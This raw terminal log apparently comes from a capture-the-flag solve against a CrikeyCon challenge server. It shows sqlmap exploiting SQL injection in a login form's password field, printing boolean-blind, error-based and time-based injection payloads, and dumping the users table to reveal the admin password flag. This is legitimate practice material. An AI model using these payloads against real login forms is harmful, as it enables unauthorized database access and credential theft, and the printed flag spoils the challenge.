web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
[22:16:26] [INFO] fetching tables for database: 'ctf'
[22:16:26] [INFO] the SQL query used returns 1 entries
[22:16:26] [INFO] resumed: users
Database: ctf
[1 table]
+-------+
| users |
+-------+

[22:16:26] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf.crikeycon.com'

[*] shutting down at 22:16:26





root@blackhat:~# sqlmap -u 'http://ctf.crikeycon.com:8003/' --data='username=%27&password=&login=Submit+Query' --risk=1 --cookie='connect.sid=s%3A2K6sIvSsPyc0M8W96l0DrFXiJkW1mGQd.vp9sSrmQ6NlXc2ymNkcqywsOjO9JKHEF1evVc0mwofI;session=.eJwVz1FrgzAUBeC_Mu6zD5q6F6GwslqxcCO6diF5s42ruSYWWkZNSv_7stdzPg6cJ_TamRmKn97ehwSMhiLL8gTm63weoHjC2wkKkG5vOZMPrFqmXOcagV66ncHQTcq1XtExV9QGvi09ujpFUaYYphxFNKRJUmcb0TmkyyJZtKL1Mlw8sh2hwIWHTaoOE5OhzWTYeNxiyql-j54p-p7iDnE6MiXK_D9rqnppqpJJV6-k4LGzIz-MRtF5Da8Efu_Dbe5dPAAZX3183q4P_TWawWp4_QEENVCR.C7P7fw.9gp4AAialH1yX46-_g4QXofF2G;' -D ctf -T users --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.1.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:16:43

[22:16:43] [WARNING] it appears that you have provided tainted parameter values ('username='') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[22:16:44] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:16:44] [INFO] resuming back-end DBMS 'mysql' 
[22:16:50] [INFO] testing connection to the target URL
[22:16:50] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: password=-2518' OR 9960=9960#&login=login=&username=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: password=' OR (SELECT 1455 FROM(SELECT COUNT(*),CONCAT(0x7170767071,(SELECT (ELT(1455=1455,1))),0x717a7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DWAo&login=login=&username=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: password=' OR SLEEP(5)-- NGfN&login=login=&username=
---
[22:16:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
[22:16:50] [INFO] fetching columns for table 'users' in database 'ctf'
[22:16:50] [INFO] the SQL query used returns 2 entries
[22:16:50] [INFO] resumed: username
[22:16:50] [INFO] resumed: varchar(50)
[22:16:50] [INFO] resumed: password
[22:16:50] [INFO] resumed: varchar(50)
[22:16:50] [INFO] fetching entries for table 'users' in database 'ctf'
[22:16:50] [INFO] the SQL query used returns 1 entries
[22:16:50] [INFO] resumed: flag{SqL_1nj3ct10nz_ar3_t00_h4RD_f0r_p1Mp5}
[22:16:50] [INFO] resumed: admin
[22:16:50] [INFO] analyzing table dump for possible password hashes
Database: ctf
Table: users
[1 entry]
+----------+---------------------------------------------+
| username | password                                    |
+----------+---------------------------------------------+
| admin    | flag{SqL_1nj3ct10nz_ar3_t00_h4RD_f0r_p1Mp5} |
+----------+---------------------------------------------+

[22:16:50] [INFO] table 'ctf.users' dumped to CSV file '/root/.sqlmap/output/ctf.crikeycon.com/dump/ctf/users.csv'
[22:16:50] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf.crikeycon.com'

[*] shutting down at 22:16:50
```


flag{SqL_1nj3ct10nz_ar3_t00_h4RD_f0r_p1Mp5} 
